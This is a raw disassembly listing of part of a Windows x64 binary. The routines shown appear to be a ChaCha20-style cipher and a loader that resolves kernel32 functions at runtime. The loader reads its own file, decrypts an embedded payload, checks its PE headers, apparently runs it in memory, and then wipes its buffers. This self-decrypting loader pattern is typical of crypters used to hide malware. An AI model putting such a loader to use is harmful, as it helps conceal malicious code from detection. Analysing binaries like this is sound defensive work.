   1400025a5:	03 54 24 54          	add    0x54(%rsp),%edx
   1400025a9:	03 d6                	add    %esi,%edx
   1400025ab:	33 d3                	xor    %ebx,%edx
   1400025ad:	c1 ca 14             	ror    $0x14,%edx
   1400025b0:	8d 04 1a             	lea    (%rdx,%rbx,1),%eax
   1400025b3:	41 03 c4             	add    %r12d,%eax
   1400025b6:	44 03 e8             	add    %eax,%r13d
   1400025b9:	44 89 6c 24 18       	mov    %r13d,0x18(%rsp)
   1400025be:	44 33 e9             	xor    %ecx,%r13d
   1400025c1:	41 c1 cd 18          	ror    $0x18,%r13d
   1400025c5:	42 8d 04 29          	lea    (%rcx,%r13,1),%eax
   1400025c9:	8b 4c 24 58          	mov    0x58(%rsp),%ecx
   1400025cd:	03 c7                	add    %edi,%eax
   1400025cf:	03 44 24 54          	add    0x54(%rsp),%eax
   1400025d3:	03 f0                	add    %eax,%esi
   1400025d5:	8b c6                	mov    %esi,%eax
   1400025d7:	89 74 24 30          	mov    %esi,0x30(%rsp)
   1400025db:	33 c2                	xor    %edx,%eax
   1400025dd:	8b 54 24 5c          	mov    0x5c(%rsp),%edx
   1400025e1:	03 ca                	add    %edx,%ecx
   1400025e3:	c1 c8 19             	ror    $0x19,%eax
   1400025e6:	41 33 cb             	xor    %r11d,%ecx
   1400025e9:	89 44 24 04          	mov    %eax,0x4(%rsp)
   1400025ed:	c1 c9 10             	ror    $0x10,%ecx
   1400025f0:	89 44 24 2c          	mov    %eax,0x2c(%rsp)
   1400025f4:	46 8d 14 09          	lea    (%rcx,%r9,1),%r10d
   1400025f8:	44 03 54 24 60       	add    0x60(%rsp),%r10d
   1400025fd:	8b 5c 24 34          	mov    0x34(%rsp),%ebx
   140002601:	42 8d 04 09          	lea    (%rcx,%r9,1),%eax
   140002605:	03 44 24 60          	add    0x60(%rsp),%eax
   140002609:	44 03 d3             	add    %ebx,%r10d
   14000260c:	44 8b 64 24 64       	mov    0x64(%rsp),%r12d
   140002611:	44 33 d2             	xor    %edx,%r10d
   140002614:	44 8b 7c 24 6c       	mov    0x6c(%rsp),%r15d
   140002619:	44 8b 0c 24          	mov    (%rsp),%r9d
   14000261d:	41 c1 ca 14          	ror    $0x14,%r10d
   140002621:	45 03 e2             	add    %r10d,%r12d
   140002624:	44 03 64 24 68       	add    0x68(%rsp),%r12d
   140002629:	44 03 e2             	add    %edx,%r12d
   14000262c:	8b 55 38             	mov    0x38(%rbp),%edx
   14000262f:	44 89 64 24 1c       	mov    %r12d,0x1c(%rsp)
   140002634:	44 33 e1             	xor    %ecx,%r12d
   140002637:	41 c1 cc 18          	ror    $0x18,%r12d
   14000263b:	41 03 c4             	add    %r12d,%eax
   14000263e:	03 d8                	add    %eax,%ebx
   140002640:	44 33 d3             	xor    %ebx,%r10d
   140002643:	89 5c 24 34          	mov    %ebx,0x34(%rsp)
   140002647:	41 c1 ca 19          	ror    $0x19,%r10d
   14000264b:	48 83 6d 80 01       	subq   $0x1,-0x80(%rbp)
   140002650:	0f 85 8b fd ff ff    	jne    0x1400023e1
   140002656:	4c 8b 45 20          	mov    0x20(%rbp),%r8
   14000265a:	f3 0f 6f 64 24 10    	movdqu 0x10(%rsp),%xmm4
   140002660:	f3 0f 6f 54 24 30    	movdqu 0x30(%rsp),%xmm2
   140002666:	4c 8b 5d 30          	mov    0x30(%rbp),%r11
   14000266a:	f3 41 0f 6f 00       	movdqu (%r8),%xmm0
   14000266f:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   140002674:	49 8b d3             	mov    %r11,%rdx
   140002677:	44 89 54 24 20       	mov    %r10d,0x20(%rsp)
   14000267c:	48 2b d1             	sub    %rcx,%rdx
   14000267f:	f3 0f 6f 5c 24 20    	movdqu 0x20(%rsp),%xmm3
   140002685:	66 0f fe e0          	paddd  %xmm0,%xmm4
   140002689:	44 89 64 24 48       	mov    %r12d,0x48(%rsp)
   14000268e:	44 89 6c 24 44       	mov    %r13d,0x44(%rsp)
   140002693:	44 89 74 24 40       	mov    %r14d,0x40(%rsp)
   140002698:	f3 0f 6f 4c 24 40    	movdqu 0x40(%rsp),%xmm1
   14000269e:	0f 11 65 90          	movups %xmm4,-0x70(%rbp)
   1400026a2:	f3 41 0f 6f 40 10    	movdqu 0x10(%r8),%xmm0
   1400026a8:	66 0f fe d8          	paddd  %xmm0,%xmm3
   1400026ac:	0f 11 5d a0          	movups %xmm3,-0x60(%rbp)
   1400026b0:	f3 41 0f 6f 40 20    	movdqu 0x20(%r8),%xmm0
   1400026b6:	66 0f fe d0          	paddd  %xmm0,%xmm2
   1400026ba:	0f 11 55 b0          	movups %xmm2,-0x50(%rbp)
   1400026be:	f3 41 0f 6f 40 30    	movdqu 0x30(%r8),%xmm0
   1400026c4:	66 0f fe c8          	paddd  %xmm0,%xmm1
   1400026c8:	0f 11 4d c0          	movups %xmm1,-0x40(%rbp)
   1400026cc:	48 83 fa 40          	cmp    $0x40,%rdx
   1400026d0:	73 71                	jae    0x140002743
   1400026d2:	48 85 d2             	test   %rdx,%rdx
   1400026d5:	75 71                	jne    0x140002748
   1400026d7:	4c 8b 4c 24 78       	mov    0x78(%rsp),%r9
   1400026dc:	41 83 40 30 01       	addl   $0x1,0x30(%r8)
   1400026e1:	75 04                	jne    0x1400026e7
   1400026e3:	41 ff 40 34          	incl   0x34(%r8)
   1400026e7:	48 83 c1 40          	add    $0x40,%rcx
   1400026eb:	49 83 e9 40          	sub    $0x40,%r9
   1400026ef:	48 89 4c 24 70       	mov    %rcx,0x70(%rsp)
   1400026f4:	4c 89 4c 24 78       	mov    %r9,0x78(%rsp)
   1400026f9:	49 3b cb             	cmp    %r11,%rcx
   1400026fc:	0f 82 7e fc ff ff    	jb     0x140002380
   140002702:	4c 8b bc 24 d8 00 00 	mov    0xd8(%rsp),%r15
   140002709:	00 
   14000270a:	4c 8b b4 24 e0 00 00 	mov    0xe0(%rsp),%r14
   140002711:	00 
   140002712:	4c 8b ac 24 e8 00 00 	mov    0xe8(%rsp),%r13
   140002719:	00 
   14000271a:	4c 8b a4 24 f0 00 00 	mov    0xf0(%rsp),%r12
   140002721:	00 
   140002722:	48 8b bc 24 f8 00 00 	mov    0xf8(%rsp),%rdi
   140002729:	00 
   14000272a:	48 8b b4 24 00 01 00 	mov    0x100(%rsp),%rsi
   140002731:	00 
   140002732:	48 8b 9c 24 08 01 00 	mov    0x108(%rsp),%rbx
   140002739:	00 
   14000273a:	48 81 c4 10 01 00 00 	add    $0x110,%rsp
   140002741:	5d                   	pop    %rbp
   140002742:	c3                   	ret
   140002743:	ba 40 00 00 00       	mov    $0x40,%edx
   140002748:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000274c:	4c 8b 4c 24 78       	mov    0x78(%rsp),%r9
   140002751:	48 03 c1             	add    %rcx,%rax
   140002754:	0f 1f 40 00          	nopl   0x0(%rax)
   140002758:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000275f:	00 
   140002760:	41 0f b6 0c 01       	movzbl (%r9,%rax,1),%ecx
   140002765:	30 08                	xor    %cl,(%rax)
   140002767:	48 8d 40 01          	lea    0x1(%rax),%rax
   14000276b:	48 83 ea 01          	sub    $0x1,%rdx
   14000276f:	75 ef                	jne    0x140002760
   140002771:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   140002776:	e9 61 ff ff ff       	jmp    0x1400026dc
   14000277b:	cc                   	int3
   14000277c:	cc                   	int3
   14000277d:	cc                   	int3
   14000277e:	cc                   	int3
   14000277f:	cc                   	int3
   140002780:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140002785:	55                   	push   %rbp
   140002786:	56                   	push   %rsi
   140002787:	57                   	push   %rdi
   140002788:	41 55                	push   %r13
   14000278a:	41 56                	push   %r14
   14000278c:	48 8d ac 24 90 fe ff 	lea    -0x170(%rsp),%rbp
   140002793:	ff 
   140002794:	48 81 ec 70 02 00 00 	sub    $0x270,%rsp
   14000279b:	e8 10 f2 ff ff       	call   0x1400019b0
   1400027a0:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400027a5:	c7 44 24 40 6b 65 72 	movl   $0x6e72656b,0x40(%rsp)
   1400027ac:	6e 
   1400027ad:	c7 44 24 44 65 6c 33 	movl   $0x32336c65,0x44(%rsp)
   1400027b4:	32 
   1400027b5:	c7 44 24 48 2e 64 6c 	movl   $0x6c6c642e,0x48(%rsp)
   1400027bc:	6c 
   1400027bd:	c6 44 24 4c 00       	movb   $0x0,0x4c(%rsp)
   1400027c2:	ff 15 c8 08 01 00    	call   *0x108c8(%rip)        # 0x140013090
   1400027c8:	4c 8b f0             	mov    %rax,%r14
   1400027cb:	48 85 c0             	test   %rax,%rax
   1400027ce:	0f 84 80 05 00 00    	je     0x140002d54
   1400027d4:	f2 0f 10 05 ac 0c 01 	movsd  0x10cac(%rip),%xmm0        # 0x140013488
   1400027db:	00 
   1400027dc:	33 c0                	xor    %eax,%eax
   1400027de:	8b 0d ac 0c 01 00    	mov    0x10cac(%rip),%ecx        # 0x140013490
   1400027e4:	48 89 45 af          	mov    %rax,-0x51(%rbp)
   1400027e8:	88 45 b7             	mov    %al,-0x49(%rbp)
   1400027eb:	0f b6 05 b6 0c 01 00 	movzbl 0x10cb6(%rip),%eax        # 0x1400134a8
   1400027f2:	88 45 c8             	mov    %al,-0x38(%rbp)
   1400027f5:	33 c0                	xor    %eax,%eax
   1400027f7:	89 45 c9             	mov    %eax,-0x37(%rbp)
   1400027fa:	66 89 45 cd          	mov    %ax,-0x33(%rbp)
   1400027fe:	88 45 cf             	mov    %al,-0x31(%rbp)
   140002801:	0f b6 05 b8 0c 01 00 	movzbl 0x10cb8(%rip),%eax        # 0x1400134c0
   140002808:	88 45 e0             	mov    %al,-0x20(%rbp)
   14000280b:	33 c0                	xor    %eax,%eax
   14000280d:	89 45 e1             	mov    %eax,-0x1f(%rbp)
   140002810:	66 89 45 e5          	mov    %ax,-0x1b(%rbp)
   140002814:	88 45 e7             	mov    %al,-0x19(%rbp)
   140002817:	8b 05 b3 0c 01 00    	mov    0x10cb3(%rip),%eax        # 0x1400134d0
   14000281d:	89 45 f0             	mov    %eax,-0x10(%rbp)
   140002820:	0f b6 05 ad 0c 01 00 	movzbl 0x10cad(%rip),%eax        # 0x1400134d4
   140002827:	88 45 f4             	mov    %al,-0xc(%rbp)
   14000282a:	33 c0                	xor    %eax,%eax
   14000282c:	48 89 45 f5          	mov    %rax,-0xb(%rbp)
   140002830:	66 89 45 fd          	mov    %ax,-0x3(%rbp)
   140002834:	88 45 ff             	mov    %al,-0x1(%rbp)
   140002837:	0f b7 05 aa 0c 01 00 	movzwl 0x10caa(%rip),%eax        # 0x1400134e8
   14000283e:	66 89 45 10          	mov    %ax,0x10(%rbp)
   140002842:	33 c0                	xor    %eax,%eax
   140002844:	89 45 12             	mov    %eax,0x12(%rbp)
   140002847:	66 89 45 16          	mov    %ax,0x16(%rbp)
   14000284b:	0f b7 05 ae 0c 01 00 	movzwl 0x10cae(%rip),%eax        # 0x140013500
   140002852:	66 89 45 28          	mov    %ax,0x28(%rbp)
   140002856:	0f b6 05 a5 0c 01 00 	movzbl 0x10ca5(%rip),%eax        # 0x140013502
   14000285d:	88 45 2a             	mov    %al,0x2a(%rbp)
   140002860:	33 c0                	xor    %eax,%eax
   140002862:	89 45 2b             	mov    %eax,0x2b(%rbp)
   140002865:	88 45 2f             	mov    %al,0x2f(%rbp)
   140002868:	8b 05 a2 0c 01 00    	mov    0x10ca2(%rip),%eax        # 0x140013510
   14000286e:	89 45 38             	mov    %eax,0x38(%rbp)
   140002871:	0f b7 05 9c 0c 01 00 	movzwl 0x10c9c(%rip),%eax        # 0x140013514
   140002878:	66 89 45 3c          	mov    %ax,0x3c(%rbp)
   14000287c:	0f b6 05 93 0c 01 00 	movzbl 0x10c93(%rip),%eax        # 0x140013516
   140002883:	88 45 3e             	mov    %al,0x3e(%rbp)
   140002886:	33 c0                	xor    %eax,%eax
   140002888:	f2 0f 11 45 a0       	movsd  %xmm0,-0x60(%rbp)
   14000288d:	0f 10 05 04 0c 01 00 	movups 0x10c04(%rip),%xmm0        # 0x140013498
   140002894:	48 89 45 3f          	mov    %rax,0x3f(%rbp)
   140002898:	88 45 47             	mov    %al,0x47(%rbp)
   14000289b:	0f b6 05 86 0c 01 00 	movzbl 0x10c86(%rip),%eax        # 0x140013528
   1400028a2:	0f 11 45 b8          	movups %xmm0,-0x48(%rbp)
   1400028a6:	88 45 58             	mov    %al,0x58(%rbp)
   1400028a9:	33 c0                	xor    %eax,%eax
   1400028ab:	0f 10 05 fe 0b 01 00 	movups 0x10bfe(%rip),%xmm0        # 0x1400134b0
   1400028b2:	89 45 59             	mov    %eax,0x59(%rbp)
   1400028b5:	66 89 45 5d          	mov    %ax,0x5d(%rbp)
   1400028b9:	0f 29 45 d0          	movaps %xmm0,-0x30(%rbp)
   1400028bd:	f2 0f 10 05 03 0c 01 	movsd  0x10c03(%rip),%xmm0        # 0x1400134c8
   1400028c4:	00 
   1400028c5:	88 45 5f             	mov    %al,0x5f(%rbp)
   1400028c8:	48 8d 05 f1 c1 01 00 	lea    0x1c1f1(%rip),%rax        # 0x14001eac0
   1400028cf:	f2 0f 11 45 e8       	movsd  %xmm0,-0x18(%rbp)
   1400028d4:	0f 10 05 fd 0b 01 00 	movups 0x10bfd(%rip),%xmm0        # 0x1400134d8
   1400028db:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   1400028e0:	48 8d 05 e1 c1 01 00 	lea    0x1c1e1(%rip),%rax        # 0x14001eac8
   1400028e7:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   1400028ec:	48 8d 05 dd c1 01 00 	lea    0x1c1dd(%rip),%rax        # 0x14001ead0
   1400028f3:	0f 29 45 00          	movaps %xmm0,0x0(%rbp)
   1400028f7:	0f 10 05 f2 0b 01 00 	movups 0x10bf2(%rip),%xmm0        # 0x1400134f0
   1400028fe:	89 4d a8             	mov    %ecx,-0x58(%rbp)
   140002901:	0f b7 0d 8c 0b 01 00 	movzwl 0x10b8c(%rip),%ecx        # 0x140013494
   140002908:	0f 11 45 18          	movups %xmm0,0x18(%rbp)
   14000290c:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   140002911:	48 8d 05 c0 c1 01 00 	lea    0x1c1c0(%rip),%rax        # 0x14001ead8
   140002918:	f2 0f 10 05 e8 0b 01 	movsd  0x10be8(%rip),%xmm0        # 0x140013508
   14000291f:	00 
   140002920:	f2 0f 11 45 30       	movsd  %xmm0,0x30(%rbp)
   140002925:	0f 10 05 ec 0b 01 00 	movups 0x10bec(%rip),%xmm0        # 0x140013518
   14000292c:	66 89 4d ac          	mov    %cx,-0x54(%rbp)
   140002930:	0f b6 0d 5f 0b 01 00 	movzbl 0x10b5f(%rip),%ecx        # 0x140013496
   140002937:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   14000293c:	48 8d 05 9d c1 01 00 	lea    0x1c19d(%rip),%rax        # 0x14001eae0
   140002943:	88 4d ae             	mov    %cl,-0x52(%rbp)
   140002946:	0f 11 45 48          	movups %xmm0,0x48(%rbp)
   14000294a:	48 89 45 80          	mov    %rax,-0x80(%rbp)
   14000294e:	48 8d 74 24 60       	lea    0x60(%rsp),%rsi
   140002953:	48 8d 05 8e c1 01 00 	lea    0x1c18e(%rip),%rax        # 0x14001eae8
   14000295a:	33 db                	xor    %ebx,%ebx
   14000295c:	48 89 45 88          	mov    %rax,-0x78(%rbp)
   140002960:	8b fb                	mov    %ebx,%edi
   140002962:	48 8d 05 87 c1 01 00 	lea    0x1c187(%rip),%rax        # 0x14001eaf0
   140002969:	48 89 45 90          	mov    %rax,-0x70(%rbp)
   14000296d:	48 8d 05 84 c1 01 00 	lea    0x1c184(%rip),%rax        # 0x14001eaf8
   140002974:	48 89 45 98          	mov    %rax,-0x68(%rbp)
   140002978:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000297f:	00 
   140002980:	8b c7                	mov    %edi,%eax
   140002982:	48 8d 55 a0          	lea    -0x60(%rbp),%rdx
   140002986:	48 8d 0c 40          	lea    (%rax,%rax,2),%rcx
   14000298a:	48 8d 14 ca          	lea    (%rdx,%rcx,8),%rdx
   14000298e:	49 8b ce             	mov    %r14,%rcx
   140002991:	ff 15 01 07 01 00    	call   *0x10701(%rip)        # 0x140013098
   140002997:	48 8b 0e             	mov    (%rsi),%rcx
   14000299a:	48 89 01             	mov    %rax,(%rcx)
   14000299d:	48 85 c0             	test   %rax,%rax
   1400029a0:	0f 84 ae 03 00 00    	je     0x140002d54
   1400029a6:	ff c7                	inc    %edi
   1400029a8:	48 83 c6 08          	add    $0x8,%rsi
   1400029ac:	83 ff 08             	cmp    $0x8,%edi
   1400029af:	7c cf                	jl     0x140002980
   1400029b1:	ba 02 00 00 00       	mov    $0x2,%edx
   1400029b6:	33 c9                	xor    %ecx,%ecx
   1400029b8:	ff 15 8a 09 01 00    	call   *0x1098a(%rip)        # 0x140013348
   1400029be:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   1400029c4:	48 8d 55 60          	lea    0x60(%rbp),%rdx
   1400029c8:	33 c9                	xor    %ecx,%ecx
   1400029ca:	44 8b e8             	mov    %eax,%r13d
   1400029cd:	ff 15 b5 06 01 00    	call   *0x106b5(%rip)        # 0x140013088
   1400029d3:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   1400029d8:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
   1400029dc:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   1400029e0:	45 33 c9             	xor    %r9d,%r9d
   1400029e3:	ba 00 00 00 80       	mov    $0x80000000,%edx
   1400029e8:	c7 44 24 20 03 00 00 	movl   $0x3,0x20(%rsp)
   1400029ef:	00 
   1400029f0:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400029f6:	ff 15 04 06 01 00    	call   *0x10604(%rip)        # 0x140013000
   1400029fc:	48 8b f8             	mov    %rax,%rdi
   1400029ff:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140002a03:	0f 84 4b 03 00 00    	je     0x140002d54
   140002a09:	4c 89 a4 24 a0 02 00 	mov    %r12,0x2a0(%rsp)
   140002a10:	00 
   140002a11:	33 d2                	xor    %edx,%edx
   140002a13:	48 8b c8             	mov    %rax,%rcx
   140002a16:	4c 89 bc 24 a8 02 00 	mov    %r15,0x2a8(%rsp)
   140002a1d:	00 
   140002a1e:	ff 15 e4 05 01 00    	call   *0x105e4(%rip)        # 0x140013008
   140002a24:	8b f0                	mov    %eax,%esi
   140002a26:	8d 8e c4 fb ff ff    	lea    -0x43c(%rsi),%ecx
   140002a2c:	81 f9 c2 fb ff ff    	cmp    $0xfffffbc2,%ecx
   140002a32:	0f 87 11 03 00 00    	ja     0x140002d49
   140002a38:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140002a3e:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
   140002a44:	8b d6                	mov    %esi,%edx
   140002a46:	33 c9                	xor    %ecx,%ecx
   140002a48:	44 8b e6             	mov    %esi,%r12d
   140002a4b:	ff 15 ef 05 01 00    	call   *0x105ef(%rip)        # 0x140013040
   140002a51:	4c 8b f8             	mov    %rax,%r15
   140002a54:	48 85 c0             	test   %rax,%rax
   140002a57:	0f 84 ec 02 00 00    	je     0x140002d49
   140002a5d:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
   140002a62:	89 5c 24 58          	mov    %ebx,0x58(%rsp)
   140002a66:	44 8b c6             	mov    %esi,%r8d
   140002a69:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140002a6e:	48 8b d0             	mov    %rax,%rdx
   140002a71:	48 8b cf             	mov    %rdi,%rcx
   140002a74:	ff 15 96 05 01 00    	call   *0x10596(%rip)        # 0x140013010
   140002a7a:	85 c0                	test   %eax,%eax
   140002a7c:	0f 84 b1 02 00 00    	je     0x140002d33
   140002a82:	39 74 24 58          	cmp    %esi,0x58(%rsp)
   140002a86:	0f 85 a7 02 00 00    	jne    0x140002d33
   140002a8c:	48 8b cf             	mov    %rdi,%rcx
   140002a8f:	ff 15 8b 05 01 00    	call   *0x1058b(%rip)        # 0x140013020
   140002a95:	4c 8d 4c 24 5c       	lea    0x5c(%rsp),%r9
   140002a9a:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140002a9f:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140002aa4:	89 5c 24 5c          	mov    %ebx,0x5c(%rsp)
   140002aa8:	8b d6                	mov    %esi,%edx
   140002aaa:	49 8b cf             	mov    %r15,%rcx
   140002aad:	e8 7e ed ff ff       	call   0x140001830
   140002ab2:	84 c0                	test   %al,%al
   140002ab4:	0f 84 82 02 00 00    	je     0x140002d3c
   140002aba:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140002abf:	33 c9                	xor    %ecx,%ecx
   140002ac1:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140002ac7:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
   140002acd:	8b 56 08             	mov    0x8(%rsi),%edx
   140002ad0:	ff 15 6a 05 01 00    	call   *0x1056a(%rip)        # 0x140013040
   140002ad6:	4c 8b f0             	mov    %rax,%r14
   140002ad9:	48 85 c0             	test   %rax,%rax
   140002adc:	0f 84 5a 02 00 00    	je     0x140002d3c
   140002ae2:	8b 54 24 5c          	mov    0x5c(%rsp),%edx
   140002ae6:	48 8b c8             	mov    %rax,%rcx
   140002ae9:	44 8b 46 08          	mov    0x8(%rsi),%r8d
   140002aed:	49 03 d7             	add    %r15,%rdx
   140002af0:	e8 9b e6 00 00       	call   0x140011190
   140002af5:	8b 56 10             	mov    0x10(%rsi),%edx
   140002af8:	8b 0e                	mov    (%rsi),%ecx
   140002afa:	8b 46 34             	mov    0x34(%rsi),%eax
   140002afd:	44 8b 46 08          	mov    0x8(%rsi),%r8d
   140002b01:	89 54 24 70          	mov    %edx,0x70(%rsp)
   140002b05:	8b 56 14             	mov    0x14(%rsi),%edx
   140002b08:	89 54 24 74          	mov    %edx,0x74(%rsp)
   140002b0c:	8b 56 18             	mov    0x18(%rsi),%edx
   140002b0f:	89 54 24 78          	mov    %edx,0x78(%rsp)
   140002b13:	8b 56 1c             	mov    0x1c(%rsi),%edx
   140002b16:	89 54 24 7c          	mov    %edx,0x7c(%rsp)
   140002b1a:	8b 56 20             	mov    0x20(%rsi),%edx
   140002b1d:	89 55 80             	mov    %edx,-0x80(%rbp)
   140002b20:	8b 56 24             	mov    0x24(%rsi),%edx
   140002b23:	89 55 84             	mov    %edx,-0x7c(%rbp)
   140002b26:	8b 56 28             	mov    0x28(%rsi),%edx
   140002b29:	89 55 88             	mov    %edx,-0x78(%rbp)
   140002b2c:	8b 56 2c             	mov    0x2c(%rsi),%edx
   140002b2f:	89 55 8c             	mov    %edx,-0x74(%rbp)
   140002b32:	49 8b d6             	mov    %r14,%rdx
   140002b35:	89 4d 9c             	mov    %ecx,-0x64(%rbp)
   140002b38:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140002b3d:	c7 44 24 40 65 78 70 	movl   $0x61707865,0x40(%rsp)
   140002b44:	61 
   140002b45:	c7 44 24 44 6e 64 20 	movl   $0x3320646e,0x44(%rsp)
   140002b4c:	33 
   140002b4d:	c7 44 24 48 32 2d 62 	movl   $0x79622d32,0x48(%rsp)
   140002b54:	79 
   140002b55:	c7 44 24 4c 74 65 20 	movl   $0x6b206574,0x4c(%rsp)
   140002b5c:	6b 
   140002b5d:	0f 10 44 24 40       	movups 0x40(%rsp),%xmm0
   140002b62:	48 89 5d 90          	mov    %rbx,-0x70(%rbp)
   140002b66:	89 45 98             	mov    %eax,-0x68(%rbp)
   140002b69:	0f 29 44 24 60       	movaps %xmm0,0x60(%rsp)
   140002b6e:	e8 ad f7 ff ff       	call   0x140002320
   140002b73:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   140002b78:	66 41 39 06          	cmp    %ax,(%r14)
   140002b7c:	0f 85 63 01 00 00    	jne    0x140002ce5
   140002b82:	41 8b 4e 3c          	mov    0x3c(%r14),%ecx
   140002b86:	48 63 d1             	movslq %ecx,%rdx
   140002b89:	49 03 d6             	add    %r14,%rdx
   140002b8c:	81 3a 50 45 00 00    	cmpl   $0x4550,(%rdx)
   140002b92:	0f 85 4d 01 00 00    	jne    0x140002ce5
   140002b98:	8b 46 08             	mov    0x8(%rsi),%eax
   140002b9b:	83 f8 40             	cmp    $0x40,%eax
   140002b9e:	73 21                	jae    0x140002bc1
   140002ba0:	b8 0b 01 00 00       	mov    $0x10b,%eax
   140002ba5:	66 39 42 18          	cmp    %ax,0x18(%rdx)
   140002ba9:	49 8b ce             	mov    %r14,%rcx
   140002bac:	0f 94 c0             	sete   %al
   140002baf:	84 c0                	test   %al,%al
   140002bb1:	0f 84 dc 00 00 00    	je     0x140002c93
   140002bb7:	e8 44 e4 ff ff       	call   0x140001000
   140002bbc:	e9 d7 00 00 00       	jmp    0x140002c98
   140002bc1:	48 81 c1 f8 00 00 00 	add    $0xf8,%rcx
   140002bc8:	48 3b c8             	cmp    %rax,%rcx
   140002bcb:	b8 0b 01 00 00       	mov    $0x10b,%eax
   140002bd0:	77 d3                	ja     0x140002ba5
   140002bd2:	0f b7 4a 18          	movzwl 0x18(%rdx),%ecx
   140002bd6:	66 3b c8             	cmp    %ax,%cx
   140002bd9:	75 14                	jne    0x140002bef
   140002bdb:	83 7a 74 0e          	cmpl   $0xe,0x74(%rdx)
   140002bdf:	76 c4                	jbe    0x140002ba5
   140002be1:	8b 8a e8 00 00 00    	mov    0xe8(%rdx),%ecx
   140002be7:	8b ba ec 00 00 00    	mov    0xec(%rdx),%edi
   140002bed:	eb 1f                	jmp    0x140002c0e
   140002bef:	bf 0b 02 00 00       	mov    $0x20b,%edi
   140002bf4:	66 3b cf             	cmp    %di,%cx
   140002bf7:	75 ac                	jne    0x140002ba5
   140002bf9:	83 ba 84 00 00 00 0e 	cmpl   $0xe,0x84(%rdx)
   140002c00:	76 a3                	jbe    0x140002ba5
   140002c02:	8b 8a f8 00 00 00    	mov    0xf8(%rdx),%ecx
   140002c08:	8b ba fc 00 00 00    	mov    0xfc(%rdx),%edi
   140002c0e:	85 c9                	test   %ecx,%ecx
   140002c10:	74 93                	je     0x140002ba5
   140002c12:	85 ff                	test   %edi,%edi
   140002c14:	74 8f                	je     0x140002ba5
   140002c16:	66 83 7a 5c 03       	cmpw   $0x3,0x5c(%rdx)
   140002c1b:	75 69                	jne    0x140002c86
   140002c1d:	ff 15 8d 04 01 00    	call   *0x1048d(%rip)        # 0x1400130b0
   140002c23:	8b d8                	mov    %eax,%ebx
   140002c25:	85 c0                	test   %eax,%eax
   140002c27:	74 5d                	je     0x140002c86
   140002c29:	b9 01 00 00 00       	mov    $0x1,%ecx
   140002c2e:	e8 1d 35 00 00       	call   0x140006150
   140002c33:	4c 8b c0             	mov    %rax,%r8
   140002c36:	48 8d 15 63 09 01 00 	lea    0x10963(%rip),%rdx        # 0x1400135a0
   140002c3d:	48 8d 0d 64 09 01 00 	lea    0x10964(%rip),%rcx        # 0x1400135a8
   140002c44:	e8 87 36 00 00       	call   0x1400062d0
   140002c49:	b9 02 00 00 00       	mov    $0x2,%ecx
   140002c4e:	e8 fd 34 00 00       	call   0x140006150
   140002c53:	4c 8b c0             	mov    %rax,%r8
   140002c56:	48 8d 15 43 09 01 00 	lea    0x10943(%rip),%rdx        # 0x1400135a0
   140002c5d:	48 8d 0d 44 09 01 00 	lea    0x10944(%rip),%rcx        # 0x1400135a8
   140002c64:	e8 67 36 00 00       	call   0x1400062d0
   140002c69:	33 c9                	xor    %ecx,%ecx
   140002c6b:	e8 e0 34 00 00       	call   0x140006150
   140002c70:	4c 8b c0             	mov    %rax,%r8
   140002c73:	48 8d 15 36 09 01 00 	lea    0x10936(%rip),%rdx        # 0x1400135b0
   140002c7a:	48 8d 0d 33 09 01 00 	lea    0x10933(%rip),%rcx        # 0x1400135b4
   140002c81:	e8 4a 36 00 00       	call   0x1400062d0
   140002c86:	8b 56 08             	mov    0x8(%rsi),%edx
   140002c89:	49 8b ce             	mov    %r14,%rcx
   140002c8c:	e8 5f ef ff ff       	call   0x140001bf0
   140002c91:	eb 05                	jmp    0x140002c98
   140002c93:	e8 58 e7 ff ff       	call   0x1400013f0
   140002c98:	33 c0                	xor    %eax,%eax
   140002c9a:	49 8b ff             	mov    %r15,%rdi
   140002c9d:	49 8b cc             	mov    %r12,%rcx
   140002ca0:	33 d2                	xor    %edx,%edx
   140002ca2:	f3 aa                	rep stos %al,(%rdi)
   140002ca4:	8b 4e 08             	mov    0x8(%rsi),%ecx
   140002ca7:	49 8b fe             	mov    %r14,%rdi
   140002caa:	f3 aa                	rep stos %al,(%rdi)
   140002cac:	49 8b cf             	mov    %r15,%rcx
   140002caf:	41 b8 00 80 00 00    	mov    $0x8000,%r8d
   140002cb5:	ff 15 95 03 01 00    	call   *0x10395(%rip)        # 0x140013050
   140002cbb:	33 d2                	xor    %edx,%edx
   140002cbd:	41 b8 00 80 00 00    	mov    $0x8000,%r8d
   140002cc3:	49 8b ce             	mov    %r14,%rcx
   140002cc6:	ff 15 84 03 01 00    	call   *0x10384(%rip)        # 0x140013050
   140002ccc:	45 85 ed             	test   %r13d,%r13d
   140002ccf:	78 06                	js     0x140002cd7
   140002cd1:	ff 15 69 06 01 00    	call   *0x10669(%rip)        # 0x140013340
   140002cd7:	85 db                	test   %ebx,%ebx
   140002cd9:	74 06                	je     0x140002ce1
   140002cdb:	ff 15 d7 03 01 00    	call   *0x103d7(%rip)        # 0x1400130b8
   140002ce1:	33 c0                	xor    %eax,%eax
